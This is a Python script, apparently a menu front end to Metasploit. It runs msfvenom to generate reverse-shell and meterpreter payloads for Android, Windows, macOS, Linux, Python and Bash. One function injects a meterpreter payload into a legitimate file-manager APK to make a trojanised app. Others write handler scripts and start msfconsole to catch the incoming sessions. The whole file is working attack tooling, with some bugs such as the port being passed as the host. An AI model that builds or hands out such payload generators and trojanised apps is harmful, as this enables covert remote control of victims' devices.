import fade , sys
from os import system
from time import sleep
from colorama import Fore
from cryptography.fernet import Fernet
def speed_print(str):
   for c in str + '\n':
     sys.stdout.write(c)
     sys.stdout.flush()
     sleep(3./9999)
def android_listner():
    q = input (f"{Fore.YELLOW}Are You want {Fore.WHITE}{Fore.BLUE}Start Listner to {Fore.RED}Metasploit {Fore.WHITE}({Fore.GREEN}Y{Fore.WHITE}/{Fore.RED}N{Fore.WHITE}) ? ")
    if q == "Y" or q == "y":
        listner_Android()
    elif q == "N" or "n":
        system("cd")
        system ("python3 /root/Desktop/Control/Start.py")
    else:
        print ("{Fore.RED}ERROR404"*200)
def windows_listner():
    q = input ("Are You want Start Listner to Metasploit (Y/N) ? ")
    if q == "Y" or q == "y":
        listner_Windows()
    elif q == "N" or "n":
        Main_Control()
    else:
         print ("{Fore.RED}ERROR404"*200)
def Android():
    host = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Privet {Fore.WHITE}IP : ")
    print (host)
    port = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Port : ")
    name = input (f"{Fore.GREEN}Enter {Fore.BLUE}Name {Fore.WHITE}Payload : ")
    system ("sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" R > /root/Desktop/"+name+".apk")
    system("figlet figlet -f future Listner | lolcat")
    speed_print(" {Fore.YEELOW}Are You Want Start a Listner {Fore.WHITE}({Fore.CYAN}Y{Fore.WHITE}/{Fore.RED}N{Fore.WHITE}) ? ")
def Injection_Android():
    host = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Privet {Fore.WHITE}IP : ")
    port = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Port : ")
    name = input (f"{Fore.GREEN}Enter {Fore.BLUE}Name {Fore.WHITE}Payload : ")
    system ("sudo msfvenom -x Files/ES-File-Explorer.apk -p android/meterpreter/reverse_tcp LHOST="+port+" LPORT="+port+" R > /root/Desktop/"+name+".apk")
def Windows():
    host = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Privet {Fore.WHITE}IP : ")
    port = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Port : ")
    name = input (f"{Fore.GREEN}Enter {Fore.BLUE}Name {Fore.WHITE}Payload : ")
    system ("sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f exe > /root/Desktop/"+name+".exe")
def Mac():
    host = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Privet {Fore.WHITE}IP : ")
    port = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Port : ")
    name = input (f"{Fore.GREEN}Enter {Fore.BLUE}Name {Fore.WHITE}Payload : ")
    system ("sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST="+host+" LPORT="+port+" -f macho > /root/Desktop/"+name+".macho")
def Linux():
    host = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Privet {Fore.WHITE}IP : ")
    port = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Port : ")
    name = input (f"{Fore.GREEN}Enter {Fore.BLUE}Name {Fore.WHITE}Payload : ")
    system ("sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f elf > /root/Desktop/"+name+".elf")
def python():
    host = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Privet {Fore.WHITE}IP : ")
    port = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Port : ")
    name = input (f"{Fore.GREEN}Enter {Fore.BLUE}Name {Fore.WHITE}Payload : ")
    system("sudo msfvenom -p cmd/unix/reverse_python LHOST="+host+" LPORT="+port+" -f raw > /root/Desktop/"+name+".py")
def Bash():
    host = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Privet {Fore.WHITE}IP : ")
    port = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Port : ")
    name = input (f"{Fore.GREEN}Enter {Fore.BLUE}Name {Fore.WHITE}Payload : ")
    system ("sudo msfvenom -p cmd/unix/reverse_bash LHOST="+host+" LPORT="+port+" -f raw > /root/Desktop/"+name+".sh")
def listner_Android():
    host = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Privet {Fore.WHITE}IP : ")
    print ("Your IP " +host)
    port = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Port : ")
    print ("Your Port " +port)
    system('rm -rf msf.rc')
    f = open('msf.rc' , 'w')
    f.write('''
    use exploit/multi/handler
    set payload android/meterpreter/reverse_tcp 
    set lhost '''+host+'''
    set lport '''+port+'''
    exploit -j
    rm -rf msf.rc
    ''')
    f.close()
    system('msfconsole -r msf.rc')
def listner_Windows():
    host = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Privet {Fore.WHITE}IP : ")
    print ("Your IP " +host)
    port = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Port : ")
    print ("port")
    system('rm -rf msf.rc')
    f = open('msf.rc' , 'w')
    f.write('''
    use exploit/multi/handler
    set payload windows/meterpreter_reverse_tcp
    set lhost '''+host+'''
    set lport '''+port+'''
    exploit -j
    rm -rf msf.rc
    ''')
    f.close()
    system('msfconsole -r msf.rc')
def listner_Linux():
    host = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Privet {Fore.WHITE}IP : ")
    port = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Port : ")
    system('rm -rf msf.rc')
    f = open('msf.rc' , 'w')
    f.write('''
    use exploit/multi/handler
    set payload linux/x86/shell/reverse_tcp 
    set lhost '''+host+'''
    set lport '''+port+'''
    exploit -j
    rm -rf msf.rc
    ''')
    f.close()
    system('msfconsole -r msf.rc')
def listner_mac():
    host = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Privet {Fore.WHITE}IP : ")
    port = input (f"{Fore.GREEN}Enter Your {Fore.YELLOW}Port : ")
    system('rm -rf msf.rc')
    f = open('msf.rc' , 'w')
    f.write("""
    use exploit/multi/handler
    set payload osx/x64/meterpreter_reverse_tcp
    set lhost """+host+"""
    set lport """+port+"""
    exploit -j
    rm -rf msf.rc
    """)
